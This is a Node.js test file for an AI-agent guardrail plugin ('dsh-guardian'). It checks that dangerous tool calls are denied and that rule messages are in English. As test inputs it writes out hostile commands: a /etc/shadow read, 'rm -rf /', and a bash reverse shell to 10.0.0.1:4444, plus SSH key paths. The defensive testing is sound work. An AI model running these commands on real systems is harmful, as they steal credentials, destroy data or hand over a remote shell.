import { test } from 'node:test'
import assert from 'node:assert/strict'
import fs from 'node:fs'
import os from 'node:os'
import path from 'node:path'
import { Context } from 'cordis'
import * as plugin from '../lib/index.js'

const { DEFAULT_RULES, SECRET_RULES, SSRF_RULES } = plugin
const HAN = new RegExp('[\\u4e00-\\u9fff]')
const wait = () => new Promise(r => setTimeout(r, 200))

function makeCtx(config = {}) {
  const logFile = path.join(fs.mkdtempSync(path.join(os.tmpdir(), 'guardian-')), 'audit.log')
  const root = new Context()
  root.plugin(plugin, { logFile, ...config })
  return { root, logFile }
}

// Mirrors dsh-guardian-bridge: tools/pre-execute -> guardian/check -> deny | next()
function preExecute(ctx, exec) {
  const verdict = ctx.bail('guardian/check', exec.name, exec.arguments)
  return verdict && verdict.intercepted
    ? { kind: 'deny', reason: `dsh-guardian blocked this call: ${verdict.reason}` }
    : { kind: 'allow' }
}

// ── Bridge-style pre-execute flow ─────────────────────
test('pre-execute denies dangerous tool calls', async () => {
  const { root } = makeCtx(); await wait()
  for (const command of ['cat /etc/shadow', 'rm -rf /', 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1']) {
    const r = preExecute(root, { name: 'bash', arguments: { command } })
    assert.equal(r.kind, 'deny', command)
    assert.match(r.reason, /^dsh-guardian blocked this call: /)
    assert.ok(!HAN.test(r.reason), `reason must be English: ${r.reason}`)
  }
})

test('pre-execute allows harmless tool calls', async () => {
  const { root } = makeCtx(); await wait()
  for (const command of ['ls -la', 'git status', 'echo hello']) {
    assert.equal(preExecute(root, { name: 'bash', arguments: { command } }).kind, 'allow', command)
  }
})

// ── Audit log content ─────────────────────────────────
test('audit log lines are valid JSON with English reason', async () => {
  const { root, logFile } = makeCtx(); await wait()
  root.bail('guardian/check', 'bash', { command: 'cat /etc/shadow' })
  await wait()
  const lines = fs.readFileSync(logFile, 'utf8').trim().split('\n')
  assert.ok(lines.length >= 1)
  const entry = JSON.parse(lines.at(-1))
  assert.equal(entry.ruleId, 'CRED-003')
  assert.equal(entry.level, 'deny')
  assert.equal(entry.reason, 'Reading system password hashes')
})

// ── Rule-set hygiene (guards against translation regressions) ──
const allRules = [
  ...DEFAULT_RULES.map(r => ['rule', r.id, r.reason, r.pattern]),
  ...SSRF_RULES.map(r => ['ssrf', r.id, r.reason, r.pattern]),
  ...SECRET_RULES.map(r => ['secret', r.id, r.description, r.pattern]),
]

test('every rule has a non-empty English reason', () => {
  for (const [kind, id, reason] of allRules) {
    assert.ok(typeof reason === 'string' && reason.trim(), `${kind}:${id} reason empty`)
    assert.ok(!HAN.test(reason), `${kind}:${id} reason still has Chinese: ${reason}`)
  }
})

test('rule ids are unique per engine', () => {
  for (const kind of ['rule', 'ssrf', 'secret']) {
    const ids = allRules.filter(r => r[0] === kind).map(r => r[1])
    assert.equal(new Set(ids).size, ids.length, `${kind} has duplicate ids`)
  }
})

test('no rule regex uses the global or sticky flag (lastIndex state)', () => {
  for (const [kind, id, , re] of allRules) {
    assert.ok(!re.global && !re.sticky, `${kind}:${id} has g/y flag`)
  }
})

// ── Path sandbox messages ─────────────────────────────
test('path sandbox verdict reasons are English', async () => {
  const { root } = makeCtx(); await wait()
  for (const p of ['/etc/passwd', '/home/u/.ssh/id_rsa', 'a\0b']) {
    const v = root.bail('guardian/path', p)
    assert.equal(v.safe, false, p)
    assert.ok(!HAN.test(v.reason), v.reason)
  }
})

// ── Source tree has no Chinese left ───────────────────
test('tracked source files contain no Chinese text', () => {
  const root = path.resolve(import.meta.dirname, '..')
  const walk = (d) => fs.readdirSync(d, { withFileTypes: true }).flatMap(e =>
    e.isDirectory() ? walk(path.join(d, e.name)) : [path.join(d, e.name)])
  for (const dir of ['src', 'lib', 'test']) {
    if (!fs.existsSync(path.join(root, dir))) continue
    for (const f of walk(path.join(root, dir))) {
      if (/\.(png|jpg|zip)$/.test(f)) continue
      assert.ok(!HAN.test(fs.readFileSync(f, 'utf8')), path.relative(root, f))
    }
  }
  for (const f of ['README.md', 'package.json', 'cordis.patch.yml']) {
    assert.ok(!HAN.test(fs.readFileSync(path.join(root, f), 'utf8')), f)
  }
})
